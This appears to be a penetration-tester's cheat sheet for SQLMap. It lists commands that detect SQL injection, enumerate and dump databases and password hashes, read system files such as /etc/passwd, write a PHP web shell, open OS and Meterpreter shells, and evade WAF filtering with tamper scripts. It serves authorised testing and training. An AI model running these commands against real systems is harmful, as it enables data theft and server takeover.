# SQLMap

**Tags:** `#sqlmap` `#sqli` `#database` `#webattacks` `#automation` `#enumeration` `#rce`

Automated SQL injection detection and exploitation tool. Detects and exploits all major SQLi types (boolean-blind, error-based, union, stacked, time-blind, inline) across 30+ database engines. Beyond data extraction, can read/write files and pop OS shells when the DB user has sufficient privileges.

**Source:** https://github.com/sqlmapproject/sqlmap — pre-installed on Kali
**Docs:** https://github.com/sqlmapproject/sqlmap/wiki/Usage

```bash
# Basic GET parameter test
sqlmap -u "http://target.com/page.php?id=1" --batch

# POST body
sqlmap -u "http://target.com/login" --data "user=admin&pass=test" --batch
```

> [!note] **When to use SQLMap vs manual** — SQLMap is noisy (many requests) and sometimes misses injections in complex contexts. Start with manual testing to confirm injection exists, then hand off to SQLMap for extraction. Use `--technique` to limit noise when injection type is already known.

---

## Target Specification

```bash
# GET parameter
sqlmap -u "http://target.com/vuln.php?id=1"

# POST body
sqlmap -u "http://target.com/login" --data "uid=1&pass=test"

# POST with specific injection point marker (*)
sqlmap -u "http://target.com/login" --data "uid=1*&pass=test"

# From saved Burp request file
sqlmap -r request.txt

# PUT method
sqlmap -u "http://target.com/api/item" --data "id=1" --method PUT

# Cookie injection (requires --level=2+)
sqlmap -u "http://target.com/" --cookie "session=abc; id=1*" --level=2

# Custom header injection
sqlmap -u "http://target.com/" -H "X-Forwarded-For: 1*"

# JSON body
sqlmap -u "http://target.com/api" --data '{"id":"1*"}' --content-type "application/json"
```

---

## Authentication & Session

```bash
# Cookie
sqlmap -u "http://target.com/page?id=1" --cookie "PHPSESSID=abc123"

# HTTP Basic auth
sqlmap -u "http://target.com/page?id=1" --auth-type Basic --auth-cred "admin:password"

# Proxy through Burp
sqlmap -u "http://target.com/page?id=1" --proxy http://127.0.0.1:8080

# SOCKS proxy
sqlmap -u "http://target.com/page?id=1" --proxy socks5://127.0.0.1:1080

# Custom User-Agent (avoid SQLMap fingerprint)
sqlmap -u "http://target.com/page?id=1" --random-agent
```

---

## Detection Tuning

```bash
# Level (1-5): controls number of payloads tested — default 1, use 5 for thorough
# Risk (1-3): controls payload aggressiveness — default 1, use 3 for more (may modify data)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Specify injection technique (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)
sqlmap -u "http://target.com/page?id=1" --technique=BEU

# Force UNION-based with known column count
sqlmap -u "http://target.com/page?id=1" --technique=U --union-cols=5

# Specify DBMS (skip fingerprinting)
sqlmap -u "http://target.com/page?id=1" --dbms=MySQL
sqlmap -u "http://target.com/page?id=1" --dbms=mssql

# Prefix/suffix for injection context
sqlmap -u "http://target.com/page?id=1" --prefix="')" --suffix="-- -"

# Add delay between requests (avoid rate limiting)
sqlmap -u "http://target.com/page?id=1" --delay=1

# Threads (default 1)
sqlmap -u "http://target.com/page?id=1" --threads=5
```

---

## Enumeration

```bash
# Banner, current user, current DB, DBA check
sqlmap -u "http://target.com/page?id=1" --batch --banner --current-user --current-db --is-dba

# List all databases
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# List tables in a database
sqlmap -u "http://target.com/page?id=1" --batch --tables -D targetdb

# List columns in a table
sqlmap -u "http://target.com/page?id=1" --batch --columns -T users -D targetdb

# Dump a table
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb

# Dump specific columns only
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb -C username,password

# Conditional dump
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users -D targetdb --where "admin=1"

# Row range (avoid dumping everything)
sqlmap -u "http://target.com/page?id=1" --batch --dump -T users --start=1 --stop=10

# Full schema
sqlmap -u "http://target.com/page?id=1" --batch --schema

# Search for table/column by name
sqlmap -u "http://target.com/page?id=1" --batch --search -T user
sqlmap -u "http://target.com/page?id=1" --batch --search -C password

# Dump all DB passwords (and attempt crack)
sqlmap -u "http://target.com/page?id=1" --batch --passwords
```

---

## File Read / Write

```bash
# Read file (requires FILE privilege)
sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-read "C:/Windows/System32/drivers/etc/hosts"

# Write file (requires FILE privilege + write access to path)
sqlmap -u "http://target.com/page?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

---

## OS Shell & Command Execution

```bash
# Interactive OS shell (requires stacked queries + FILE/xp_cmdshell/UDF)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Interactive SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Single OS command
sqlmap -u "http://target.com/page?id=1" --os-cmd "whoami"

# Meterpreter session (MSSQL / MySQL with write access)
sqlmap -u "http://target.com/page?id=1" --os-pwn
```

---

## WAF / Filter Bypass — Tamper Scripts

```bash
# List all available tamper scripts
sqlmap --list-tampers

# Use a tamper script
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page?id=1" --tamper=base64encode

# Common tamper combos for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --random-agent
```

| Tamper | Effect |
|---|---|
| `space2comment` | Replaces spaces with `/**/` |
| `between` | Replaces `>` with `NOT BETWEEN` and `=` with `BETWEEN` |
| `randomcase` | Randomizes keyword case (`SELECT` → `SeLeCt`) |
| `base64encode` | Base64-encodes entire payload |
| `0eunion` | Replaces `UNION` with `e0UNION` |
| `percentage` | Adds `%` before each char (`SELECT` → `%S%E%L%E%C%T`) |
| `space2dash` | Replaces spaces with `-- X\n` comment |
| `plus2concat` | Replaces `+` with MSSQL `CONCAT()` |
| `versionedkeywords` | Wraps keywords in MySQL versioned comments |

---

## CSRF Token Handling

```bash
# Tell SQLMap about the CSRF token parameter
sqlmap -u "http://target.com/form" --data "id=1&csrf=TOKENVALUE" --csrf-token="csrf"

# Randomized hash parameter (SQLMap evaluates Python to generate it)
sqlmap -u "http://target.com/page?id=1" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"
```

---

## Output & Logging

```bash
# Store raw traffic to file
sqlmap -u "http://target.com/page?id=1" --traffic-file /tmp/traffic.txt

# Verbose output (1-6, default 1)
sqlmap -u "http://target.com/page?id=1" -v 3

# Results saved to: ~/.local/share/sqlmap/output/<target>/
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
